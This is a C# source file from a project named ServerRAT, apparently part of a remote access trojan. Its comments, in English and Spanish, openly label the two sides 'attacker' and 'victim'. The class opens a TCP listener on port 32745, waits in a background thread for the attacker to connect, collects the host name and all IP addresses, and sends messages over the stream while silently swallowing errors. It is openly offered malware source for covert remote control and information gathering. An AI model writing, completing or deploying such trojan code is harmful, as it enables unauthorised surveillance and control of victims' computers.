using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ServerRAT
{
    //This class will send back valuable information to the attacker. Uses different port of communicaton
    public class ResponseThread
    {
        public static int port = 32745;//puerto de comuniacion
        public static TcpListener listener = new TcpListener(IPAddress.Any, port);
        public static Thread conn = new Thread(awaitConnection);
        public static TcpClient client;
        public static NetworkStream dataStream;//se envia y recive informacion a traves de aqui
        public static char[] separator = "/".ToCharArray();//":" separa el comando

        //Encodes message to then be sent
        public void sendMessage(string msg)
        {
            char[] data = msg.ToCharArray();
            byte[] buffer = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                buffer[i] = (byte)data[i];
            }

            try
            {
                dataStream.Write(buffer, 0, buffer.Length);
                dataStream.Flush();
            }//En este caso, si no hay ningun servidor (victima) en linea no se podrá hacer nada
            catch (Exception ex) { }
        }
        //Will wait until the attacker is online
        static void awaitConnection()
        {
            do
            {
                listener.Start();
                client = listener.AcceptTcpClient();
                dataStream = client.GetStream();
            } while (client.Connected != true);
        }
        //Builder
        public ResponseThread()
        {
            //While loading tries to connect (on another Thread) to server
            conn.Start();
        }
        //Se asegura de que al cerrar se acaben todos los procesos
        private void exit()
        {
            Environment.Exit(0);
        }
        //Cambio el puerto de comuniacion
        public static void setport(int _port) { Console.WriteLine("-" + port + "=>" + _port); port = _port; Console.WriteLine("-New port: " + port); }
        //Returns true if client(victim) is online
        private bool CheckConnection()
        {
            //Checks connection status
            bool connectionAvaliable = System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable();
            return connectionAvaliable;
        }
        //Gets ips and machine name
        private string GetMyData()
        {
            string temp = "";

            String strHostName = string.Empty;
            // Getting Ip address of local machine...
            // First get the host name of local machine.
            strHostName = Dns.GetHostName();
            // Then using host name, get the IP address list..
            IPHostEntry ipEntry = Dns.GetHostEntry(strHostName);
            IPAddress[] addr = ipEntry.AddressList;

            string ips = "";
            for (int i = 0; i < addr.Length; i++)
            {
                if (i == 2) { ips += "*IP Address " + i + " : " + addr[i].ToString() + "\n"; }
                else { ips += "IP Address " + i + " : " + addr[i].ToString() + "\n"; }

            }

            temp = "Local Machine's Host Name: " + strHostName + "\n" + ips;

            return temp;
        }
        //Returns true if server(victim) is online
        private bool GetServerStatus()
        {
            bool serv_status = false;
            try
            {
                //Tratará de borrar el dataStream (datos que se envian por la red)
                //pero si los servidores están offline, no van a poder, asi que se le avisa al atacante mediante el GUI
                byte[] buffer = new byte[0];
                int offset = 0;
                int size = 0;
                dataStream.Write(buffer, offset, size);
                dataStream.Flush();
                serv_status = true;

            }
            catch (Exception ex) { serv_status = false; }

            return serv_status;
        }
    }
}
